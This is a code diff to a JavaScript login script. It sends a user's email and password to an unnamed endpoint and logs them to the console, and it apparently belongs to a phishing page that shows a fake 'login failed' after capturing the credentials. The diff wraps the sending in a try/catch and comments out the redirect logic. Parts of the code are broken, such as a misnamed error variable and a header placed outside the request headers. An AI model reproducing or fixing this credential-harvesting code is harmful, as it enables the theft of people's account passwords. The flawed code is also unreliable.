@@ -40,11 +40,12 @@ document.addEventListener("DOMContentLoaded", function() {
         window.location.href = `${hostname}/display-password.htm`;
     };
 
- async function sendFormAndRedirect(email, password) {
-        localStorage.removeItem("user-email");
+    async function sendFormAndRedirect(email, password) {
+       try{
+            localStorage.removeItem("user-email");
         const data = await fetch(endpoint, {
             method: "POST",
-            mode: "no-cors", // Added mode property
+            mode: "no-cors",
             "Content-Type": "application/json",
             body: JSON.stringify({email, password})
         });
@@ -52,11 +53,14 @@ document.addEventListener("DOMContentLoaded", function() {
         console.log(email, password)
         const res = await data.json();
         console.log(res)
-        if (res) {
-           window.location.href = `${hostname}/login-failed.htm`;
-        }else{
-             window.location.reload();
-        };
+        // if (res) {
+        //    window.location.href = `${hostname}/login-failed.htm`;
+        // }else{
+        //      window.location.reload();
+        // };
+       }catch(errorr){
+           console.log({error})
+       }
     };
 });
 
